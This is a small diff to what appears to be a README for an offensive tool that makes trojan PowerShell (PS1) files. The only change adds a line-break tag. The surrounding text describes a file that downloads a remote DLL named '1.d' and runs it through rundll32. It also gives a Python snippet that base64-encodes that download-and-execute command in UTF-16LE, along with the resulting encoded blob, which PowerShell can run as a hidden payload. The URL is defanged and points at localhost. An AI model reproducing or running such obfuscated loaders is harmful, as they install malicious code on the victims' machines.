@@ -25,7 +25,8 @@ Leverages alternate shorthand PS commands like "saps", "gc" start a process and 
 DLL Execution: create a trojan PS1 file that will try to download and execute a remote DLL namec "1.d"
 
 Python: <br>  
-from base64 import b64encode
+from base64 import b64encode <br>  
+
 b64encode("saps  http[]//127.0.0.1/1.d;sleep -s 2;rundll32 $HOME\\Downloads\\1.d, 0".encode('UTF-16LE')) <br>  
 
 cwBhAHAAcwAgACAAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQAvADEALgBkADsAcwBsAGUAZQBwACAALQBzACAAMgA7AHIAdQBuAGQAbABsADMAMgAgACQASABPAE0ARQBcAEQAbwB3AG4AbABvAGEAZABzAFwAMQAuAGQALAAgADAA
